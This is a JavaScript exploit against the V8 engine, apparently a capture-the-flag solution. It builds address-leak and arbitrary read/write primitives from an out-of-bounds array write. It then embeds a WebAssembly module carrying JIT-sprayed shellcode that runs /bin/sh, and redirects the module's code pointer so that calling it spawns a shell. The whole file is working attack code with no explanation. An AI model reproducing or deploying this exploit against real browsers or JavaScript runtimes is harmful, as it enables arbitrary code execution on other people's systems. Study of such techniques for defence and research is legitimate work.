//
// Utility functions.
//

/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
  // typeof(val) = float
  f64_buf[0] = val;
  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) {
  // typeof(val) = BigInt
  u64_buf[0] = Number(val & 0xffffffffn);
  u64_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

function hex(val) {
  // typeof(vale) = BigInt
  return "0x" + val.toString(16).padStart(16, "0");
}

//
//
// BEGIN EXPLOIT
//
//

const EMPTY_PROPERTIES = 0x7bdn;
const PACKED_DOUBLE_ELEMENTS_MAP = 0x4b651n;

const addrof = (obj) => {
  const victim = [{}, 1.2];
  const oob = [1.1];
  victim[0] = obj;
  oob.set([itof((EMPTY_PROPERTIES << 32n) | PACKED_DOUBLE_ELEMENTS_MAP)], -3);
  return ftoi(victim[0]) & 0xffffffffn;
};

const arb_read = (addr) => {
  const victim = [{}, 1.2];
  const oob = [1.1];
  oob.set(
    [
      itof((EMPTY_PROPERTIES << 32n) | PACKED_DOUBLE_ELEMENTS_MAP),
      itof(((BigInt(victim.length) * 2n) << 32n) | (addr - 8n)),
    ],
    -3,
  );
  return ftoi(victim[0]);
};

const arb_write = (addr, data) => {
  const victim = [{}, 1.2];
  const oob = [1.1];
  oob.set(
    [
      itof((EMPTY_PROPERTIES << 32n) | PACKED_DOUBLE_ELEMENTS_MAP),
      itof(((BigInt(victim.length) * 2n) << 32n) | (addr - 8n)),
    ],
    -3,
  );
  victim[0] = itof(data);
};

// const test = [1.1, 1.2];
// %DebugPrint(test);
// console.log(hex(addrof(test)));
// console.log(hex(arb_read(addrof(test))));

var wasm_code = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112,
  0, 0, 5, 3, 1, 0, 1, 7, 17, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109,
  97, 105, 110, 0, 0, 10, 133, 1, 1, 130, 1, 0, 65, 0, 68, 0, 0, 0, 0, 0, 0, 0,
  0, 57, 3, 0, 65, 0, 68, 106, 59, 88, 144, 144, 144, 235, 11, 57, 3, 0, 65, 0,
  68, 104, 47, 115, 104, 0, 91, 235, 11, 57, 3, 0, 65, 0, 68, 104, 47, 98, 105,
  110, 89, 235, 11, 57, 3, 0, 65, 0, 68, 72, 193, 227, 32, 144, 144, 235, 11,
  57, 3, 0, 65, 0, 68, 72, 1, 203, 83, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68,
  72, 137, 231, 144, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 72, 49, 246, 72,
  49, 210, 235, 11, 57, 3, 0, 65, 0, 68, 15, 5, 144, 144, 144, 144, 235, 11, 57,
  3, 0, 65, 42, 11,
]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var get_shell = wasm_instance.exports.main;
// Do **NOT** call the function get_shell, otherwise this won't work.
// get_shell();

// Get the address of the wasm instance trusted data
// %DebugPrint(wasm_instance);
console.log("[+] wasm instance @ " + hex(addrof(wasm_instance)));
var trusted_data = arb_read(addrof(wasm_instance) + 8n) >> 32n;
console.log("[+] trusted_data @ " + hex(trusted_data));
var trusted_data_ptr_to_code = trusted_data + 0x8n * 5n;
var code = arb_read(trusted_data_ptr_to_code);
console.log("[+] code @ " + hex(code));
var shellcode_addr = code + 0x900n + 0x27n;
arb_write(trusted_data_ptr_to_code, shellcode_addr);
get_shell();
for (; ;) { }
